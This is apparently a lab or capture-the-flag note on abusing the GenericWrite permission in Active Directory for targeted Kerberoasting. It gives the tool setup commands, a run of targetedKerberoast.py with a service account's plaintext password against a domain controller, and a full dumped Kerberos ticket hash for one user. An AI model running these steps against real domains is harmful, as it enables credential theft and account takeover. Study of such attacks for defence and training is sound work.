# GenericWrite

---

This allows us to retrieve the Hash of the user, by kerberoasting.

## PoC

Downloaded the following tool.

```
https://github.com/ShutdownRepo/targetedKerberoast.git
```

In order to run the script properly, we'll need to install the requirements in the .txt file, but we can only do this in an virtual environment. Let's set one up!

```
python3 -m venv myenv
source myenv/bin/activate
```

Installed requirements.

```
pip install -r requirements.txt
```

```
./targetedKerberoast.py -v -d 'hokkaido-aerospace.com' -u 'hrapp-service' -p 'Untimed$Runny' --dc-ip 192.168.209.40
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (Hazel.Green)
[+] Printing hash for (Hazel.Green)
$krb5tgs$23$*Hazel.Green$HOKKAIDO-AEROSPACE.COM$hokkaido-aerospace.com/Hazel.Green*$0efcff80c82f2ae480798a3b6fbde589$004070e4356a8fa83d520c554b87d04843746172f01260d5a1e080d8110410bb8b4f36df8df1368285c87c970e8c6e981693f0bdf73a4b7a81b5472cc79b000ea4e2b2ad357f74d63b31574a3e54d537875f164e4eb3054d0a509ca6d94baed3d4107683137ff938d1e89488c45c80b526449eb530dc92b7afb1fba3910ce8cd507b5fa74ef6b6acbd141f9feab40c53fba5f77136ff8dfe234c8a9167f48e2035420d437af9bbdd496fc0648c7f9af23c4b2125cae3fc39060949ac87205fe6be0c5af8a0e6ce9f281930e986546a0e44385d1b056a6d070d62972e56387a7f404849a36e849294ff8ea967a4ac632c81cbb76092de87857641194764a19f95fe0d92d27f5c1ae621588bf5f6545e533f7077af760ea98acb934eb522b79e029ac65b065b34c62d23f3d470606bd644d612392b779e61a8b016f81405e9dcccba2a6075f00e25ff6802fd56ac63cb9482877abf5c9be349ab1b68d7fe66e4363fcf92de74448f30a03f19b52f751e640d3a925ede3332741991daff664f8469bebe529675b81664d015ecfb9ddccc2a840bf20aa7a26ea718eb88a39904eed219c81e29a299c1f0e4091fd1ef5403d8ebbaff2f918ba58b4c573a97a00df4d295586070faf6ee53e405567ecb90500555a29916f26b45a114b443062a40505400fe9fe78a2be1bf9f8c799f131de375b900be3caad1f5f17bf09b7de45ff01c4dbdb6539514c8326bd2a31b3fb95d1eed82cd7a67eace8774536f458e5453982995f0d36d0c9b171b9cff523c5946b6621ef39be51ab359bc3801e86829d05672d54ec440b0de761e37c1767215bda0295695d60353071db45bfdd97224341d27f75e4e624cd5220605bace4b3cccbd5d81b8ead3745ef6596bedd529a78d1e5076c0709f0a3d6fd7aaf90a7b97f7a698627b430843d52de7d93748f8a5c26e28a7d532d9be5e1d0da0699791e7c4db4580909cfff3a9d9f763c4e8cfb6113ad9c4ae7f03033cde6683b03ccc203aa98039de0198bd7a3470edc119172ddfbc079a8d6b83a76031fb2298a9b02e98662464a6f7f7851dd16eae566b51b09855ca83e6ed640e038f51004cc1fcfb207b68097d0061f69cd6c06fcf060bc0e9d9a77620c52359614a02e4f6eba4e37a4299d5f1e2ed1460b1d06add4a7f8ac58b8b5b66579400e3c44679aadaae66472e4578125c3164befc10ec206004542f850a26b05bda73663f4d88bcf5347f80c0b9e414ed5205ce3ce6a56940b52f9da4d8691e6e279ac863af9a411d8a14a051847e41503dd3e2b9b6679ca2730f3af01607e0e208b1b7afcde74ae8062d0152354f65aae6a9720d3e54028d4e2705cdc1f9a91999f45276282ff41f41cee7f9fbff756f8eb9ed9ee98af79fdc89ec1c31a5b52dde5499bdc931f75f7cb0199a651e202e6888ed81ba20819f5d203480daa3465357ff552729c354b5b9cd8722726edc375622301f0c425f4f20bdd0e0e98a521289401c46aa1ee7051013f33924b92ebe1adee178da4f156bc65f55b82f6b4a1d952a5f42c528455abbd9b9b1dc92aff44c6cb35d412a351e4c066928da1905391bf17fbee424eda58ebfd3c574bfadbdb29de0729d6b856f8dafcf673238a5a3e74eaf60e8e4f3f0
[VERBOSE] SPN removed successfully for (Hazel.Green)
```

